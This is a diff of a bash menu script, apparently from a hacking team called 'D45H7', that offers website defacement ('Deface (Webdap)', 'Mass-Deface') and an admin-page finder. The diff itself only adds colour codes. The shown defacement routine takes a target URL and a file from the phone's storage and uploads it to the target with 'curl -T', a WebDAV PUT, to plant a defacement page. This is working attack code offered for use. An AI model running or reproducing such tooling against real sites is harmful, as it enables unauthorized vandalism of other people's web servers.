@@ -15,11 +15,11 @@ echo $yellow"  Team      : D45H7"
 echo $blue"  Version   : 1.5"
 echo $purple"  Thx to    : L1nUx3R - MrRed - MR.B1GSMOK3 - D45H7"
 echo $white"////////////////////////////////////////////////////////////////"
-echo "(1) Deface (Webdap)"
-echo "(2) Mass-Deface"
-echo "(3) Admin Finder"
-echo "(X) Exit"
-echo "(I) Info"
+echo $cyan"(1) Deface (Webdap)"
+echo $blue"(2) Mass-Deface"
+echo $white"(3) Admin Finder"
+echo $purple"(X) Exit"
+echo $yellow"(I) Info"
 echo $purple"___________________________________"
 echo $cyan"NOTE: STORE SCRIPT IN INTERNAL STORAGE"
 echo $blue"___________________________________"
@@ -31,10 +31,10 @@ then
 figlet -f future "W E B D A V"
 echo $green "Target?"
 echo $white ",__"$green"root@D45H7"$cyan" ~/Operation"$white
-read -p " •__# "  tg
+read -p " •__# " tg
 echo $green "Script?"
 echo $white ",__"$green"root@D45H7"$cyan" ~/Operation"$white
-read -p " •__# "  sc
+read -p " •__# " sc
 curl -T /storage/emulated/0/$sc $tg
 echo $blue"-}>>>>>>>} Result = $tg/$sc "
 echo $cyan"("$yellow"B"$cyan")"$white"Back "$cyan"("$yellow"X"$cyan")"$white"Exit"
